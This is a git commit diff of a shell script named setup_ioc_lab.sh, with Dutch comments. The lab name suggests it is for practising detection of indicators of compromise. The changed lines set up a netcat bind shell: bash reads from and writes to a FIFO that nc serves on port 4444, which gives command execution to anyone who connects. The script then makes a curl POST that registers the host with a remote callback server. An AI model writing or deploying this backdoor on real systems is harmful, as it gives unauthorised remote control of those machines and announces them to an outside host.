c23c290a8846f914a9ed3e0f412cc4fe83f0f080
yvesdebeer <yves.debeer@gmail.com>
2025-05-05 12:57:05 +0200

    Update setup_ioc_lab.sh

--- setup_ioc_lab.sh
+++ setup_ioc_lab.sh
@@ -6,26 +6,18 @@ PORT=4444
 FIFO="/tmp/.fifo_$PORT"
 CALLBACK_PORT=5000
 
-# Zorg dat er geen oude sessies/pipe bestaan
-pkill -f "nc -lvnp $PORT"
+# Stop oude processen
+pkill -f "nc -lvnp $PORT" 2>/dev/null
+pkill -f "bash < $FIFO" 2>/dev/null
 rm -f "$FIFO"
 mkfifo "$FIFO"
 
-# Start de shell-listener in loop
-(
-  while true; do
-    echo "[*] Wacht op verbinding op poort $PORT..."
-    cat "$FIFO" | nc -lvnp "$PORT" > "$FIFO"
-  done
-) &
+# Start shell die communiceert via FIFO
+# Wordt gevoed door nc, output gaat terug via FIFO
+( while true; do bash < "$FIFO" > "$FIFO" 2>&1; done ) &
 
-# Start bash die input van FIFO leest
-(
-  while true; do
-    bash < "$FIFO" > "$FIFO" 2>&1
-  done
-) &
-
+# Start netcat listener die stdin naar FIFO stuurt
+( while true; do nc -lvnp "$PORT" < "$FIFO" > "$FIFO"; done ) &
 
 # Eerste registratie naar monitoringserver
 curl -s -X POST http://$SERVER_IP:$CALLBACK_PORT/update \
